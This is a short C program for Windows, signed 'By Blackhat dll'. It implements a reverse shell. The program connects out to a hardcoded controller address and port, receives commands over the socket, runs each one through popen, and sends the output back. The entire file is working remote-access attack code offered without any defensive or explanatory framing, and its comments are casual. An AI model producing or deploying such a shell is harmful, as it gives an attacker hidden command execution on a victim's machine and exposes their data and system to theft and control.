/** By Blackhat dll */

#define WIN32_LEAN_AND_MEAN

#include <stdlib.h>
#include <stdio.h>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// constants
#define ADDRESS "192.168.10.7"
#define PORT "9999"
#define RECV_BUFFER_SIZE 1024
#define SEND_BUFFER_SIZE 8192

int __cdecl main(int argc, char **argv) {
	WSADATA wsa_data;
	SOCKET sock = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;

	char buffer[RECV_BUFFER_SIZE];
	int status;

	// initialize winsock
	status = WSAStartup(MAKEWORD(2, 2), &wsa_data);

	if (status != 0) {
		printf("WSAStartup failed with error: %d\n", status);
		return status;
	}

	// what does the zeromemory thing do
	ZeroMemory(&hints, sizeof(hints));

	// set hints and ai family and socktype and protocol
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// resolve the server address and port
	status = getaddrinfo(ADDRESS, PORT, &hints, &result);

	if (status != 0) {
		printf("getaddrinfo failed with error: %d\n", status);
		WSACleanup(); // cleanup winsock i guess
		return status;
	}

	// attempt to connect to an address until it succeeds
	for (ptr = result; ptr != NULL; ptr = ptr -> ai_next) {
		// create a socket
		sock = socket(ptr -> ai_family, ptr -> ai_socktype, ptr -> ai_protocol);

		if (sock == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// connect to the server
		status = connect(sock, ptr -> ai_addr, (int)ptr -> ai_addrlen);

		if (status == SOCKET_ERROR) {
			printf("connect failed with error: %d\n", WSAGetLastError());
			closesocket(sock);
			sock = INVALID_SOCKET;

			continue;
		}

		break; // we did it
	}

	freeaddrinfo(result); // free the address info

	if (sock == INVALID_SOCKET) { // if we didn't do it
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	FILE *stream;
	char output[SEND_BUFFER_SIZE];
	
	// wait for commands
	do {
		// clear the buffer and output
		memset(buffer, 0, strlen(buffer));
		memset(output, 0, strlen(output));

		status = recv(sock, buffer, RECV_BUFFER_SIZE, 0);

		if (status <= 0) {
			printf("recv failed with error: %d\n", WSAGetLastError());
			break; // connection got closed or error
		}
		
		// execute command and get output
		stream = popen(buffer, "r");
		fread(output, SEND_BUFFER_SIZE, 1, stream);

		pclose(stream);

		// send output
		status = send(sock, output, (int)strlen(output), 0);

		if (status == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			break; // error when sending output
		}
	} while (status > 0);

	// clean up everything
    closesocket(sock);
    WSACleanup();

	return 0;
}